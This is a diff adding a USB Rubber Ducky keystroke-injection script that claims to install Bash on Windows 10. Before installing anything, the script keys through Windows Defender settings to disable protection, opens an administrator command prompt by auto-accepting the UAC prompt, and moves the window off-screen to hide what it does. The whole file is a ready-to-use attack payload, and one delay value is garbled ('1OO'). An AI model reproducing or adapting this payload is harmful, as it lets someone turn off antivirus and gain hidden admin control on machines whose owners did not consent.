@@ -1,0 +1,63 @@
+REM Installs Bash on Windows 10 64bit
+REM Update from: https://github.com/S0AndS0/Perinoid_Pipes
+REM General instructions found at: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript
+REM Turn off Windows defender and clear action center
+REM  instructions found at: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---Windows-10-:-Disable-windows-defender
+REM Start of script...
+REM Let HID enumerate
+DELAY 1000
+REM Start of Windows defender mitigations by: judge2020
+ESCAPE
+DELAY 100
+CONTROL ESCAPE
+DELAY 100
+STRING Windows Defender Settings
+ENTER
+DELAY 2000
+REM why TAB and HOME?
+TAB
+DELAY 50
+REM why TAB and HOME?
+HOME
+DELAY 50
+ALT F4
+DELAY 3200
+REM Windows + a = ????
+GUI a
+DELAY 500
+ENTER
+DELAY 1OO
+GUI a
+REM End of Windows defender mitigations
+REM Hit the 'Windows' key and 'r' for run
+GUI r
+REM Wait for a few CPU cycles
+DELAY 50
+REM Start of obvuscation...
+REM Based off instructions found at: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---generic-batch
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+REM Start of escelated permissions work around
+REM  Instructions from: www.howtogeek.com/howto/windows-vista/run-a-command-as-administrator-from-the-widows-vista-run-box
+CONTROL SHIFT ENTER
+DELAY 500
+REM Get rid of authentication pop-up
+ALT c
+DELAY 500
+ENTER
+REM End of escelated permissions work around
+REM Remember that we are Admin now.
+DELAY 750
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
+REM End of obvuscation...
+REM Write a string into the 'Run' menu command to install Bash without prompt
+REM Based off instructions found at: http://www.howtogeek.com/249966/how-to-install-and-use-the-linux-bash-shell-on-windows-10/
+STRING cmd lxrun /install /y
+REM Commit to starting local shell
+ENTER
+REM Wait for a few CPU cycles
+DELAY 100
+REM End of script...
